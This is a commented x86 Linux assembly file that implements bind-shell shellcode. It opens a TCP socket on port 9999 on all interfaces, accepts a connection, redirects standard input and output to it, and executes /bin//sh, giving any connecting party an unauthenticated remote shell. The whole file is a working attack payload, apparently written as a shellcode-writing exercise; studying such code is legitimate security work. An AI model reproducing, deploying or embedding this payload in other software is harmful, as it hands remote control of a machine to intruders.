;
; Filename: shell_bind_tcp.asm
; Author:   Fernando Benedictti
;

global _start			

segment .text
_start:
  ; select the sys_socketcall system call (0x66)
  ; int socketcall (int call, unsigned long *args)
  push 0x66
  pop eax

  ; select the function of socketcall invocation (0x1)
  ; int socket (int domain, int type, int protocol)
  push 0x1
  pop ebx

  cdq                   ; copies the value of the 31th bit (sign) of EAX in every
                        ; bit position of EDX (initialize EDX to 0)
  push edx              ; protocol = 0 (IPPROTO_IP = 0x0)
  push ebx              ; type = 1 (SOCK_STREAM = 0x1)
  push 0x2              ; domain = 2 (AF_INET = 0x2)

  mov ecx, esp          ; save the pointer to the stack in ecx

  int 0x80              ; execute the sys_socketcall->socket

  ; ---

  pop esi               ; ESI = 0x0002, a side effect is that the 16 most significant
                        ; bits are initialized to 0
  xchg esi, eax         ; save the file descriptor in ESI and EAX = 2
  xchg ebx, eax         ; exchange the values of EBX and EAX registers
                        ; EBX = 2 (necessary for Bind function
  mov al, 0x66          ; select the sys_socketcall system call (0x66)

  ; prepare the structure struct_sockaddr_in for bind
  push edx              ; sin_addr = 0 (accept connections to any dir)
  push word 0x0f27      ; sin_port = 9999 (listen in this port)
  push word bx
  mov ecx, esp          ; save the pointer to the stack in ecx

  push 0x10             ; length of struct_sockaddr = 16
  push ecx              ; pointer to struct_sockaddr
  push esi              ; file descriptor's socket of previous call

  mov ecx, esp          ; save the pointer to the stack in ecx

  int 0x80              ; execute sys_socketcall->bind

  ; ---

  ; select the sys_socketcall system call (0x66)
  ; int socketcall (int call, unsigned long *args)
  mov al, 0x66

  ; select the function of socketcall invocation (0x4)
  ; int listen (int sockfd, int backlog)
  add bl, 0x2

  push edx              ; backlog = 0
  push esi              ; file descriptor's socket of previous call

  mov ecx, esp          ; save the pointer to the stack in ecx

  int 0x80              ; execute sys_socketcall->listen

  ; select the sys_socketcall system call (0x66)
  ; int socketcall (int call, unsigned long *args)
  mov al, 0x66

  ; select the function of socketcall invocation (0x5)
  ; int accept (int sockfd, struct sockaddr *addr, socklen
  inc ebx

  push edx              ; addrlen = 0
  push edx              ; addr = 0
  push esi              ; file descriptor's socket of previous call

  mov ecx, esp          ; save the pointer to the stack in ecx

  int 0x80              ; execute sys_socketcall->accept

  xor ecx, ecx
  mov cl, 0x2
  mov ebx, eax          ; save file descriptor's client socket

loop:
  ; select the sys_dup2 system call (0x3f)
  ; int dup2 (int oldfd, int newfd)
  mov al, 0x3f
  int 0x80              ; execute sys_dup2
  dec ecx
  jns loop

  ; select the sys_execve system call (0x0b)
  ; int execve(const char *filename, char *const argv[], char *const envp[])
  push 0xb
  pop eax

  push edx
  push 0x68732f2f       ;"hs//"
  push 0x6e69622f       ;"nib/"

  inc ecx

  mov ebx, esp          ; save the pointer to stack in ecx

  int 0x80              ; execute sys_execve
